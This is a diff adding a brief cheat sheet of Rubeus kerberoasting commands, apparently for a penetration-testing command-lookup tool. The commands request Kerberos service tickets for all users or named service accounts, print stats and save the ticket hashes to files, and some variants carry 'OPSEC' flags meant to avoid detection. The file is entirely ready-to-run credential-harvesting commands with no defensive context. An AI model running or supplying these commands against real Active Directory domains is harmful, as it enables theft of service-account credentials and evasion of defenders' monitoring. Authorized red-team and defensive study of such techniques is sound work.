@@ -1,0 +1,23 @@
+% Rubeus
+
+# list kerberoast stats
+.\Rubeus.exe kerberoast /stats
+
+# list kerberoast stats (OPSEC)
+.\Rubeus.exe kerberoast /stats /rc4opsec
+
+# request kerberoast TGS all users
+.\Rubeus.exe kerberoast /simple
+
+# request kerberoast TGS for user
+.\Rubeus.exe kerberoast /user:<serviceaccount> /simple
+
+# request kerberoast TGS for user (OPSEC)
+.\Rubeus.exe kerberoast /user:<serviceaccount> /simple /rc4opsec
+
+# request kerberoast TGS all users an save to file 
+.\Rubeus.exe kerberoast /outfile:<outfile-path>
+
+# request kerberoast TGS all users an save to file (OPSEC)
+.\Rubeus.exe kerberoast /rc4opsec /outfile:<outfile-path>
+
